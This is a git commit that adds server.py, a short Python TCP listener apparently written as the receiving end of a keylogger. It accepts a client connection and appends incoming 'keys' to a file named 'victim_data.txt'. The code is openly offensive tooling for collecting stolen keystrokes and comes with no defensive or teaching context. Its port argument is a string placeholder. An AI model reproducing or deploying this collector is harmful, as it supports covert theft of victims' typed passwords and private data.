5c0844b82f76dec122df8efc92b41f634fbfb42e
Oxshady <shadymahmod55@gmail.com>
2024-06-21 05:14:22 +0300

    reciver -_-

---
+++ server.py
@@ -0,0 +1,52 @@
+import socket
+
+class Server:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.server = None
+        self.client_sock = None
+        self.client_add = None
+        self.file = "./victim_data.txt"
+
+    def start_socket(self):
+        try:
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind((self.ip, self.port))
+        except socket.error as err:
+            print(f"socket creation error: {err}")
+
+    def connect(self):
+        self.start_socket()
+        try:
+            self.server.listen(5)
+            self.client_sock, self.client_add = self.server.accept()
+            print(f"client connected successfully from ip: {self.client_add[0]} and port: {self.client_add[1]}")
+        except socket.error as err:
+            print(f"client connection error: {err}")
+
+    def to_file(self, keys):
+        if keys:
+            with open(self.file, 'a') as f:
+                f.write(keys)
+
+    def data(self):
+        self.connect()
+        try:
+            while True:
+                keys = self.client_sock.recv(1024).decode()
+                if keys:
+                    self.to_file(keys)
+                else:
+                    break
+        except socket.error as err:
+            print(f"receiving data error: {err}")
+        finally:
+            if self.client_sock:
+                self.client_sock.close()
+            if self.server:
+                self.server.close()
+
+if __name__ == "__main__":
+    Ser = Server("server_ip", "server port")
+    Ser.data()
